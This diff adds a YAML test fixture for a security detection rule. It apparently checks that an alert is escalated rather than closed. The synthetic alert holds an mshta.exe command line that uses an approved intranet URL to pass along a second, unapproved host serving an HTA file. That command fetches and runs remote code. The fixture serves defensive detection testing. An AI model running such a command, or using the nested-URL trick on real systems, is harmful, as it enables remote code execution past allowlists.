@@ -1,0 +1,22 @@
+# Aimed case for PR-0005: the cheapest attacker position that satisfies the path group's yes answers. It must flag or escalate in every mode, never close.
+detection: D-0005
+name: d-0005-step1-q0
+reason: MSHTA precedent reused with a second, unapproved URL host after the approved one
+proof: PR-0005
+closures:
+- kind: manual_shadow_close
+  analyst: a1
+- kind: manual_shadow_close
+  analyst: a2
+overrides:
+  Q-0017: false
+  Q-0014: 0
+alert:
+  host.name: ws-12
+  user.name: jdoe
+  process.name: mshta.exe
+  process.parent_name: explorer.exe
+  process.sha256: '5555555555555555555555555555555555555555555555555555555555555555'
+  process.command_line: mshta.exe https://intranet.corp.example/app.hta?r=https://cdn-dl.example.net/x.hta
+  event.time: '2026-10-17T08:00:00Z'
+  severity: medium
